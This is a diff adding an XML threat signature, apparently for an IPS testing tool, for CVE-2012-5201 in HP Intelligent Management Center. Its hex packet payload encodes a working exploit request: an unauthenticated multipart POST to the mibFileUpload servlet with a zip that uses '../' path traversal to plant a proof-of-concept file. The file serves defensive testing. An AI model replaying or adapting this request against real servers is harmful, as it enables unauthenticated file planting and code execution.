@@ -1,0 +1,86 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="HP Intelligent Management Center mibFileUpload Servlet Arbitrary File Upload"/>
+    <EngDesc display="true" value="An arbitrary file upload vulnerability exists in HP Intelligent Management Center. The vulnerability is due to the&#13;&#10;mibFileUpload servlet accepts unauthenticated file uploads and processes zip files in an insecure way.&#13;&#10;A remote unauthenticated attacker can upload arbitrary files to arbitrary locations. In a successful attack scenario,&#13;&#10;the attacker can execute arbitrary code with SYSTEM privileges."/>
+    <Intent display="true">
+      <item value="ACCESS_CONTROL_WEAKNESS"/>
+    </Intent>
+    <Protocol display="true" value="HTTP,HTTPS"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Severity display="true" value="Critical"/>
+    <Known_Vendors_Affected display="true">
+      <item value="HP"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="HP_Intelligent_Management_Center"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="HP_Intelligent_Management_Center_v5.1_E0202_and_prior"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="TSL20130326-01"/>
+    <CVEID display="true" value="CVE-2012-5201"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="91026"/>
+    <Author display="true" value=""/>
+    <ID display="true" value="ed60bd915c9fba9924f503cdc56c5641"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="network"/>
+    <AccessComplexity display="false" value="medium"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="635025805069373022"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1367055037" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="D"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+    <for index="B">
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:50:56:B4:0D:64" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0305" Identification="E1A4" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="F455" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="57492" destPort="$HTTPdestPort" SeqNumber="BC1C8B95" AckNumber="113CE05F" HeaderLength="08" WindowSize="002E" Checksum="E5DB" UrgentPointer="0000" Options="0101080A862A6A3700000000" Payload="504F5354202F696D632F776562646D2F6D696262726F777365722F6D696246696C6555706C6F616420485454502F312E310D0A486F73743A20646863703231343A383038300D0A557365722D4167656E743A204D6F7A696C6C612F342E302028636F6D70617469626C653B204D53494520362E303B2057696E646F7773204E5420352E31290D0A436F6F6B69653A204A53455353494F4E49443D43434343434343434343434343434343434343434343434343434343434343430D0A436F6E74656E742D547970653A206D756C7469706172742F666F726D2D646174613B20626F756E646172793D5F5645564D56564D6755484A76623259746232597449454E76626D4E6C634851675132396B5A513D3D0D0A436F6E74656E742D4C656E6774683A203432330D0A0D0A2D2D5F5645564D56564D6755484A76623259746232597449454E76626D4E6C634851675132396B5A513D3D0D0A436F6E74656E742D446973706F736974696F6E3A20666F726D2D646174613B206E616D653D22506F43223B2066696C656E616D653D22706F632E7A6970220D0A436F6E74656E742D547970653A206170706C69636174696F6E2F6F637465742D73747265616D0D0A0D0A504B030414000000000061598142D17EF6C329000000290000002B0000002E2E2F2E2E2F2E2E2F2E2E2F2E2E2F2E2E2F2E2E2F2E2E2F2E2E2F2E2E2F2E2E2F2E2E2F706F632E74787450726F6F662D6F662D436F6E636570742066726F6D2054454C5553205365637572697479204C616273504B0102140014000000000061598142D17EF6C329000000290000002B00000000000000000000000000000000002E2E2F2E2E2F2E2E2F2E2E2F2E2E2F2E2E2F2E2E2F2E2E2F2E2E2F2E2E2F2E2E2F2E2E2F706F632E747874504B05060000000001000100590000007200000000000D0A2D2D5F5645564D56564D6755484A76623259746232597449454E76626D4E6C634851675132396B5A513D3D2D2D" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="00:50:56:B4:0D:64" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="00DE" Identification="6DA6" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="2A7B" srcIP="$destIP" destIP="172.16.1.2" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$HTTPdestPort" destPort="57492" SeqNumber="113CE05F" AckNumber="BC1C8E66" HeaderLength="08" WindowSize="FD2E" Checksum="774E" UrgentPointer="0000" Options="0101080A004BF0BD862A6A37" Payload="485454502F312E3120323030204F4B0D0A5365727665723A204170616368652D436F796F74652F312E310D0A5365742D436F6F6B69653A204A53455353494F4E49443D39344546423242363146333935394144443634414541313530384541374235413B20506174683D2F696D630D0A436F6E74656E742D4C656E6774683A20300D0A446174653A204D6F6E2C2030312041707220323031332031353A31303A303120474D540D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
